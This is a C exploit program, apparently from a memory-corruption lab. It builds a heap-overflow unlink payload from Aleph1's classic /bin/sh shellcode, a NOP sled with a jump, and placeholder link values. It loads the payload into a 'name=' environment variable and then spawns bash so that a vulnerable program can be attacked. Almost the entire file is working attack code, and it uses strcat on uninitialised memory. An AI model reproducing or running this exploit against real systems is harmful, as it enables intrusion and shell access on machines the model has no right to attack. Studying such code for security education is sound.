#include <stdio.h>
#include <stdlib.h>

#define NOP                            0x90
#define ENV_STRING                   "name="

/*
Aleph1's Linux shellcode
from "Smashing the stack for fun and profit",
Phrack 49, vol 7
*/
char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
  char *new_buff, *command_buff;
  long where, what, *ptr;
  
  int bsize = 127, new_bsize, command_bsize, i, env_offset;

  printf("Length of shell code: %d\n", strlen(shellcode));
  if (bsize < strlen(shellcode) + 20){
    printf("Length of buffer is too small to contain the shell code.\n ");
    exit(0);
  }
  //printf("Using where: 0x%x\n", where-12);
  //printf("Using what: 0x%x\n", what+8);

  new_bsize = bsize;
  if(!(new_buff = malloc(new_bsize+1))) {
    printf("Can't allocate exploit buffer.\n");
    exit(0);
  }

  char *prefix = "XXXXYYYY"; // placeholders for forward and back links
  char *nop_jmp = "\x90\x90\x90\x90\x90\x90\xEB\x04";  // 6 NOPs, JMP +4
  char *overwrite = "ZZZZ";         //P->next->prev = P->prev. overwritten

  strcat(new_buff, prefix);
  strcat(new_buff, nop_jmp);
  strcat(new_buff, overwrite);
  strcat(new_buff, shellcode);

  // put some none-null character until the end of the buffer
  for (i=strlen(new_buff); i<bsize; i++){
    new_buff[i] = '\x90';
  }


  new_buff[new_bsize] = 0;
  
  env_offset = strlen(ENV_STRING);
  command_bsize = env_offset + new_bsize + 1;
  if(!(command_buff = malloc(command_bsize))) {
    printf("Can't allocate command buffer.\n");
    exit(0);
  }
  strcpy(command_buff, ENV_STRING);
  strcat(command_buff, new_buff);

  putenv(command_buff);
  system("/bin/bash");
}

